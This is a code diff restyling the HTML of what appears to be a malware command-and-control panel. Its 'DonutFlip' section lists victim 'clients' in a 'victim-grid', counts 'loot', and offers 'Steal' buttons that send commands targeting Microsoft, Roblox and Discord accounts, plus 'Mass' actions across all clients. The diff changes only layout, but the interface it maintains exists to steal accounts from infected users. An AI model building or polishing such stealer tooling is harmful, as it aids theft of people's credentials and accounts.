@@ -155,15 +155,16 @@
     <div class="page-head">
       <div>
         <h2 style="display:flex;align-items:center;gap:10px">
-          <span style="width:28px;height:28px;border-radius:8px;background:#122018;border:1px solid #22c55e55;display:inline-flex;align-items:center;justify-content:center">
-            <span style="width:12px;height:12px;border-radius:50%;border:2px solid #22c55e;display:inline-block"></span>
-          </span>
+          <span style="width:22px;height:22px;border-radius:50%;border:2px solid #22c55e;display:inline-block;box-shadow:inset 0 0 0 5px #0b1210,0 0 0 1px #22c55e33"></span>
           DonutFlip
         </h2>
         <p class="sub" id="donut-count">0 clients</p>
       </div>
-      <div class="row" style="gap:8px;align-items:center;flex-wrap:wrap">
-        <input id="donut-search" placeholder="filter…" oninput="refreshDonut()" style="max-width:180px"/>
+      <div class="top-actions">
+        <div class="search">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3"/></svg>
+          <input id="donut-search" placeholder="filter…" oninput="refreshDonut()"/>
+        </div>
         <button class="cmd sm" type="button" onclick="refreshDonut()">Refresh</button>
         <button class="cmd sm" type="button" onclick="donutMass('donut_sites')">Mass DF+Surge</button>
         <button class="cmd sm" type="button" onclick="donutMass('donutflip')">Mass DF only</button>
@@ -173,22 +174,21 @@
 
     <div class="victim-grid" id="donut-list"></div>
 
-    <div id="donut-detail" class="hidden" style="margin-top:14px">
-      <div class="card" style="padding:14px;border:1px solid var(--border);border-radius:12px;margin-bottom:12px">
-        <div style="display:flex;justify-content:space-between;align-items:flex-start;gap:12px;flex-wrap:wrap">
-          <div>
-            <button class="cmd sm" type="button" onclick="closeDonutDetail()">← back</button>
-            <h2 id="donut-title" style="margin:8px 0 4px">Donut client</h2>
-            <div class="muted" id="donut-sub" style="font-size:12px"></div>
-          </div>
-          <div style="display:flex;gap:6px;flex-wrap:wrap">
-            <span class="tag mild" id="df-loot-count">0 loot</span>
-            <span class="tag" id="df-session-tag">session ?</span>
-            <button class="cmd sm danger" type="button" onclick="donutDelete()">Remove</button>
-          </div>
+    <div id="donut-detail" class="hidden" style="margin-top:20px;display:none">
+      <div class="control-head" style="margin-bottom:12px">
+        <button class="back-btn" type="button" onclick="closeDonutDetail()" title="back">
+          <svg viewBox="0 0 24 24" width="18" height="18"><path d="M15 18l-6-6 6-6" fill="none" stroke="currentColor" stroke-width="2"/></svg>
+        </button>
+        <div class="control-title">
+          <h2 id="donut-title">Donut client</h2>
+          <p id="donut-sub">—</p>
         </div>
+        <div class="stat-pills" id="donut-stats"></div>
+        <button class="cmd sm danger" type="button" onclick="donutDelete()">Remove</button>
+      </div>
 
-        <div style="font-weight:600;margin:14px 0 8px">Steal</div>
+      <div class="card" style="padding:14px;border:1px solid var(--border);border-radius:12px;margin-bottom:12px">
+        <div style="font-weight:600;margin-bottom:8px">Steal</div>
         <div style="display:flex;flex-wrap:wrap;gap:8px">
           <button class="cmd primary" type="button" onclick="donutCmd('donut_sites')">DonutFlip + Surge</button>
           <button class="cmd" type="button" onclick="donutCmd('donutflip')">DonutFlip only</button>
@@ -198,11 +198,10 @@
           <button class="cmd" type="button" onclick="donutCmd('microsoft')">Microsoft</button>
           <button class="cmd" type="button" onclick="donutCmd('roblox')">Roblox</button>
           <button class="cmd" type="button" onclick="donutCmd('discord')">Discord</button>
-          <button class="cmd" type="button" onclick="donutCmd('hello')">Ping / refresh</button>
+          <button class="cmd" type="button" onclick="donutCmd('hello')">Ping</button>
           <button class="cmd" type="button" onclick="openDonut(currentDonutEid)">Refresh loot</button>
         </div>
-
-        <div style="margin-top:12px" class="muted" id="donut-meta" style="font-size:12px;white-space:pre-wrap"></div>
+        <div id="donut-meta" class="muted" style="font-size:12px;margin-top:12px;white-space:pre-wrap"></div>
       </div>
 
       <div class="card" style="padding:14px;border:1px solid var(--border);border-radius:12px">
